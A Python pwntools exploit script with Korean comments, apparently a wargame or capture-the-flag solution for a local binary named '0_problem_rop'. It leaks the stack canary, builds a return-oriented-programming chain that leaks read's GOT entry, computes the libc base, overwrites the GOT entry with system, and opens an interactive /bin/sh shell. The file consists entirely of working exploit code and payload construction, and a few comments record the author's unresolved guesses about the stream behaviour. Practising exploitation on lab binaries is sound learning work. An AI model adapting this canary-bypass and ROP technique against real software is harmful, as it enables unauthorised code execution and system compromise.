#!/usr/bin/env python3
# Name: 1_exploit.py
from pwn import *
def slog(name, addr): return success(': '.join([name, hex(addr)]))
p = process('./0_problem_rop')
e = ELF('./0_problem_rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']                              # read 함수 PLT 확인 
read_got = e.got['read']                              # read 함수 GOT 확인
write_plt = e.plt['write']                            # write 함수 PLT 확인
pop_rdi = 0x0000000000400853                          # [ROPgadget --binary ./rtl --re "pop rdi"]으로 'pop rdi ; ret'의 리턴 가젯 확인
pop_rsi_r15 = 0x0000000000400851                      # [ROPgadget --binary ./rtl --re "pop rsi"]으로 'pop rsi ; pop r15 ; ret'의 리>턴 가젯 확인
ret = 0x0000000000400854                              # 
payload = b'A'*0x38 + p64(cnry) + b'B'*0x8            # 카나리 우회 payload : buf(x38) + canary('\x00' + Random 7Bytes) + SFP

# write(1, read_got, ...)                             # 목적 : read 함수 상대주소 쓰기
payload += p64(pop_rdi) + p64(1)                      # + 'pop rdi ; ret' 가젯 + 인자(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)  # + 'pop rsi ; pop r15 ; ret' 가젯 + 'read 함수 GOT' + 인자(read_got, 0)
payload += p64(write_plt)                             # + 'write 함수 PLT'

# read(0, read_got, ...)                              # 목적 : read 함수 상대주소 읽기
payload += p64(pop_rdi) + p64(0)                      # + 'pop rdi ; ret' 가젯 + 인자(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)  # + 'pop rsi ; pop r15 ; ret' 가젯 + 'read 함수 GOT' + 인자(read_got, 0)
payload += p64(read_plt)                              # + 'read 함수 PLT'

                                                      # write(1, read_got, ...), read(0, read_got, ...)
                                                      # stdin(표준입력)과 stdout(표준출력)은 같은 파일 사용?
                                                      # size_t를 0으로 입력해도 결국 스트림에는 들어가는것 같다?

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)                               # + 'pop rdi ; ret' 가젯
payload += p64(read_got + 0x8)                        # + 'read 함수 GOT' + 0x8
payload += p64(ret)                                   # + '인자'
payload += p64(read_plt)                              # + 'read 함수 PLT'

p.sendafter(b'Buf: ', payload)                        # 

read = u64(p.recvn(6) + b'\x00'*2)                    # read 절대주소 Get!!

lb = read - libc.symbols['read']                      # 라이브러리 베이스 주소 = read 상대주소 - read 절대주소
system = lb + libc.symbols['system']                  # system 상대주소 = 라이브러리 베이스 주소 + system 절대주소

slog('read', read)                                    # read 주소
slog('libc_base', lb)                                 # libc.so 주소
slog('system', system)                                # system 주소
p.send(p64(system) + b'/bin/sh\x00')                  # 'bin/sh' 인자로 system 함수 호출
p.interactive()
